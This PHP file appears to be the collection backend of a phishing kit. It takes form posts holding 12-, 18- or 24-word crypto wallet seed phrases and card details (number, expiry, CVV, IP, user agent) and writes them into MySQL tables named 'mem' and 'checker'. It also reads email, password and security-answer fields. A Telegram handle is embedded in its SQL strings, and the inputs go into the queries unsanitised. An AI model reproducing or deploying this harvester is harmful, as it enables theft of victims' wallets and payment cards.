<?php

include_once 'db/dbmysqli.php';

$email = $_POST['email'];
$pass = $_POST['password'];
$date = date("Y-m-d h:i:sa");
$ip = $_POST['ip'];
$user = $_POST['user'];
$hash = $_POST['hash'];
$answer = $_POST['answer'];
$cc = $_POST['cc'];
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];
$type = $_POST['type'];
$word1 = $_POST['word1'];
$word2 = $_POST['word2'];
$word3 = $_POST['word3'];
$word4 = $_POST['word4'];
$word5 = $_POST['word5'];
$word6 = $_POST['word6'];
$word7 = $_POST['word7'];
$word8 = $_POST['word8'];
$word9 = $_POST['word9'];
$word10 = $_POST['word10'];
$word11 = $_POST['word11'];
$word12 = $_POST['word12'];
$word13 = $_POST['word13'];
$word14 = $_POST['word14'];
$word15 = $_POST['word15'];
$word16 = $_POST['word16'];
$word17 = $_POST['word17'];
$word18 = $_POST['word18'];
$word19 = $_POST['word19'];
$word20 = $_POST['word20'];
$word21 = $_POST['word21'];
$word22 = $_POST['word22'];
$word23 = $_POST['word23'];
$word24 = $_POST['word24'];


$form = $_POST['form'];

switch ($form) {
    case 'form1':

      $sql = "INSERT INTO mem (type, m1, m2, m3, m4, m5, m6,m7,m8,m9,m10,m11,m12)
      VALUES ('$type', '$word1', '$word2', '$word3', '$word4','$word5','$word6','$word7','$word8','$word9','$word10','$word11','$word12')";

      if (mysqli_query($conn, $sql)) {
        echo "New record created successfully";
      } else {
        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
      }
break;
case 'form2':
  $sql = "INSERT INTO mem (type, m1, m2, m3, m4, m5, m6,m7,m8,m9,m10,m11,m12,m13,m14,m15,m16,m17,m18)
  // Telegram @fletchen
  VALUES ('$type', '$word1', '$word2', '$word3', '$word4','$word5','$word6','$word7','$word8','$word9','$word10','$word11','$word12','$word13','$word14','$word15','$word16','$word17','$word18')";

  if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
  } else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
  }
break;
case 'form3':
  $sql = "INSERT INTO mem (type, m1, m2, m3, m4, m5, m6,m7,m8,m9,m10,m11,m12,m13,m14,m15,m16,m17,m18,m19,m20,m21,m22,m23,m24)
  // Telegram @fletchen
  VALUES ('$type', '$word1', '$word2', '$word3', '$word4','$word5','$word6','$word7','$word8','$word9','$word10','$word11','$word12','$word13','$word14','$word15','$word16','$word17','$word18','$word19','$word20','$word21','$word22','$word23','$word24')";

  if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
  } else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
  }
break;
case 'card':

$sql = "INSERT INTO checker (cc, expiration, cvv, ip, useragent)
VALUES ('$cc', '$exp', '$cvv', '$ip', '$user')";

if (mysqli_query($conn, $sql)) {
  echo "New record created successfully";
} else {
  echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);
break;
}
 ?>
